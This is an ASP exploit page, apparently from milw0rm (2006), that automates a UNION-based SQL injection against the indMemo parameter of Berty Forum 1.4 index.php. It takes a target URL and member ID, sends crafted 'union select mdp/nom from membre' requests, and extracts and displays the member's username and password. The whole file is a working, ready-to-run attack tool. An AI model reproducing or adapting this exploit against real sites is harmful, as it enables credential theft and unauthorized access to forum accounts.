<% Response.Buffer = True %>
<% On Error Resume Next %>
<% Server.ScriptTimeout = 100 %>

<%

'===============================================================================================
'[Script Name: Berty Forum <= 1.4(index.php) Remote Blind SQL Injection Exploit
'[Coded by   : ajann
'[Author   : ajann
'[Contact    : :(
'[ExploitName: exploit1.asp
'[Greetz To: ## T�m M�sl�man Aleminin Ramazan Bayrami MUBAREK Olsun , Bir Daha Nasib Olur �nsallah ##

'[Note : exploit file name =>exploit1.asp
'[Using : Write Target and ID after Submit Click
'===============================================================================================

%>

<html>
<title>Berty Forum v1.4(index.php) Blind SQL Injection Exploit</title>
<head>

<script language="JavaScript">    
  function functionControl1(){  
        setTimeout("functionControl2()",2000);    
     }  
  
  function functionControl2(){  
            if(document.form1.field1.value==""){  
 
     alert("[Exploit Failed]=>The Username and Password Didnt Take,Try Again");
        
                             }  
                        }

  function writetext() {

            if(document.form1.field1.value==""){
document.getElementById('htmlAlani').innerHTML='<font face=\"Verdana\" size=\"1\" color=\"#008000\">There is a problem... The Data Didn\'t Take </font>'

                            }
                 }
  function write(){  
        setTimeout("writetext()",1000);    
     }  
  
</script>


</head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
<body bgcolor="#000000" link="#008000" vlink="#008000" alink="#008000">

<center>
<font face="Verdana" size="2" color="#008000"><b><a href="exploit1.asp">Berty Forum &lt;=</b>v1.4(index.php) <u><b>
Blind SQL Injection Exploit</b></u></a></font><br><br>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="35%" id="AutoNumber1" bordercolorlight="#808080" bordercolordark="#008000" bordercolor="#808080">
  <tr>
    <td width="50%" bgcolor="#808000" onmouseover="javascript:this.style.background='#808080';" onmouseout="javascript:this.style.background='#808000';">
    <font face="Arial" size="1"><b><font color="#FFFFFF">TARGET:</font>Example:[http://x.com/path]</b></font><p>
    <b><font face="Arial" size="1" color="#FFFFFF">USER ID:</font></b><font face="Arial" size="1"><b>Example:[User 
    ID=1]</b></font></td>
    <td width="50%"><center>
<form method="post" name="form1" action="exploit1.asp?islem=get">
<input type="text" name="text1" value="http://" size="25" style="background-color: #808080"><br><input type="text" name="id" value="1" size="25" style="background-color: #808080">
<input type="submit" value="Get"></center></td>
  </tr>

</table>

<div id=htmlAlani></div>

<%
islem = Request.QueryString("islem")    
If islem = "hata1" Then 
Response.Write "<font face=""Verdana"" size=""1"" color=""#008000"">There is a problem! Please complete to the whole spaces</font>"
End If
If islem = "hata2" Then 
Response.Write "<font face=""Verdana"" size=""1"" color=""#008000"">There is a problem! Please right character use</font>"
End If
If islem = "hata3" Then 
Response.Write "<font face=""Verdana"" size=""1"" color=""#008000"">There is a problem! Add ""http://""</font>"
End If
%>

<%  

If islem = "get" Then

string1="/index.php?consult=1&indMemo="
string2="-1%20union select%20"
string3="mdp%20"
string4="from%20"
string5="membre%20"
string6="where%20"
string7="ind like%20"
string8=Request.Form("id")
string9="/index.php?consult=1&indMemo="
string10="-1%20union select%20"
string11="nom%20"
string12="from%20"
string13="membre%20"
string14="where%20"
string15="ind like%20"
string16=Request.Form("id")

targettext = Request.Form("text1")
arama=InStr(1, targettext, "union" ,1)
arama2=InStr(1, targettext, "http://" ,1)

If targettext="" Then
Response.Redirect("exploit1.asp?islem=hata1")

Else
If arama>0 then 
Response.Redirect("exploit1.asp?islem=hata2")

Else
If arama2=0 then 
Response.Redirect("exploit1.asp?islem=hata3")

Else
%> 

<%

target1 = targettext+string1+string2+string3+string4+string5+string6+string7+string8
target2 = targettext+string9+string10+string11+string12+string13+string14+string15+string16

Public Function take(come)
Set objtake = Server.CreateObject("Microsoft.XMLHTTP" )
With objtake
  .Open "GET" , come, FALSE
  .sEnd
take =  .Responsetext
End With
SET objtake = Nothing
End Function

get_username = take(target1)
get_password = take(target2)

getdata=InStr(get_username,"""720"" valign=""top"">" )
username=Mid(get_username,getdata+19,20)
passwd=Mid(get_password,getdata+19,20)

%>
<center>
<font face="Verdana" size="2" color="#008000"> <u><b>
ajann<br></b></u></font>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="35%" id="AutoNumber1" bordercolorlight="#808080" bordercolordark="#008000" bordercolor="#808080">
  <tr>
    <td width="50%" bgcolor="#808000" onmouseover="javascript:this.style.background='#808080';" onmouseout="javascript:this.style.background='#808000';">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    <b><font size="2" face="Arial">User Name:</font></b></td>
    <td width="50%">&nbsp;<b><font color="#C0C0C0" size="2" face="Verdana"><%=username%></font></b></td>
  </tr>
  <tr>
    <td width="50%" bgcolor="#808000" onmouseover="javascript:this.style.background='#808080';" onmouseout="javascript:this.style.background='#808000';">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    <b><font size="2" face="Arial">&nbsp;User Password:</font></b></td>
    <td width="50%">&nbsp;<b><font color="#C0C0C0" size="2" face="Verdana"><%=passwd%></font></b></td>
  </tr>

</table>

<form method="POST" name="form2" action="#">    
<input type="hidden" name="field1" size="20" value="<%=passwd%>"></p>      
</form> 

</center>

<script language="JavaScript">
write()
functionControl1()
</script>

</body>
</html>

<%
End If
End If
End If
End If
Set objtake = Nothing 
%>

# milw0rm.com [2006-10-24]
